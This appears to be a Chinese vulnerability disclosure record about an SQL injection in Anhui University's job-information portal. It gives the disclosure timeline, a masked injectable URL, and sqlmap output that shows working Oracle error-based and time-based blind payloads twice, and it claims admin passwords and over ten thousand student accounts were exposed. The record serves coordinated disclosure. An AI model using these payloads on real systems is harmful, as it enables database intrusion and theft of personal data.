wybug_title: 安徽大学就业信息网SQL注入漏洞
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2016-01-17：	细节已通知厂商并且等待厂商处理中									2016-01-18：	厂商已经确认，细节仅向厂商公开									2016-01-28：	细节向核心白帽子及相关领域专家公开									2016-02-07：	细节向普通白帽子公开									2016-02-17：	细节向实习白帽子公开									2016-02-27：	细节向公众公开  简要描述： 安徽大学（Anhui University），简称安大（AHU），坐落于安徽省省会合肥市 ；学校是国家“211工程”重点建设高校，入选“卓越法律人才教育培养计划”，是“国家华文教育基地”和“中国政府奖学金来华留学生接收院校”，由教育部与安徽省人民政府共建。 详细说明：  注入点：**.**.**.**/detach.portal?.pmn=view&action=bulletinBrowser&ignoreSessionInvalid=true&.ia=false&.pen=pe188&bulletinId=95a53cef-5083-11e5-a8f6-6ba7eede8b86*
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 52 HTTP(s) requests:---Parameter: #1* (URI)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: http://**.**.**.**:80/detach.portal?.pmn=view&action=bulletinBrowser&ignoreSessionInvalid=true&.ia=false&.pen=pe188&bulletinId=95a53cef-5083-11e5-a8f6-6ba7eede8b86' AND 2561=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (2561=2561) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(107)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'Lqgs'='Lqgs    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: http://**.**.**.**:80/detach.portal?.pmn=view&action=bulletinBrowser&ignoreSessionInvalid=true&.ia=false&.pen=pe188&bulletinId=95a53cef-5083-11e5-a8f6-6ba7eede8b86' AND 4592=DBMS_PIPE.RECEIVE_MESSAGE(CHR(81)||CHR(98)||CHR(71)||CHR(79),5) AND 'hrqq'='hrqq---[17:59:33] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle


注入到管理账户密码：

泄露一万多学生账户

   漏洞证明：  注入点：**.**.**.**/detach.portal?.pmn=view&action=bulletinBrowser&ignoreSessionInvalid=true&.ia=false&.pen=pe188&bulletinId=95a53cef-5083-11e5-a8f6-6ba7eede8b86*
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 52 HTTP(s) requests:---Parameter: #1* (URI)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: http://**.**.**.**:80/detach.portal?.pmn=view&action=bulletinBrowser&ignoreSessionInvalid=true&.ia=false&.pen=pe188&bulletinId=95a53cef-5083-11e5-a8f6-6ba7eede8b86' AND 2561=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (2561=2561) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(107)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'Lqgs'='Lqgs    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: http://**.**.**.**:80/detach.portal?.pmn=view&action=bulletinBrowser&ignoreSessionInvalid=true&.ia=false&.pen=pe188&bulletinId=95a53cef-5083-11e5-a8f6-6ba7eede8b86' AND 4592=DBMS_PIPE.RECEIVE_MESSAGE(CHR(81)||CHR(98)||CHR(71)||CHR(79),5) AND 'hrqq'='hrqq---[17:59:33] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle
